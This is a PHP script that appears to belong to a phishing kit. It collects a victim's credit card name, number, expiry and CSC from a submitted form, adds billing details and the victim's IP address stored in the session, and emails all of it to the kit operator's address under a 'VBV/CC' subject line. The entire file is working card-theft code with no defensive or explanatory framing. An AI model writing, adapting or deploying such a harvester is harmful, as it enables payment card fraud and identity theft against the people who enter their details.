<?php
  session_start();
  require_once("../inc/config.inc.php");
  if(isset($_GET['submit'])) {
    $creditn = $_GET['cardn'];
    $number = $_GET['number'];
    $exp = $_GET['exp'];
    $csc = $_GET['csc'];
    /* Mail */
    $ip = $_SESSION['_ip_'];
    $cd = $_SESSION['cd'];
    $body = "
|=====================♥ S3XY BILLING ♥===================<br />
|Frist Name = ".$_SESSION['fn']."
|Address    = ".$_SESSION['addline']."
|City       = ".$_SESSION['city']."
|State      = ".$_SESSION['state']."
|Zip Code   = ".$_SESSION['postal']."
|Country    = ".$_SESSION['country']."
|Mobile/Phone = ".$_SESSION['mobile']."
|Phone number = ".$_SESSION['phone']."
|====================♥ S3XY VBV / CC ♥====================<br />
|Card Name  = $creditn
|Card Number = $number
|EXP        = $exp
|csc        = $csc
|--------------------Parsonal Info-----------------<br />
ip = http://www.geoiptool.com/?IP=$ip
    ";
    $subject = "♥ S3XY VBV/CC From [$cd] - $ip ♥";
    mail($tomail, $subject, $body);
    echo "RESULT:DONE;";
  }
?>
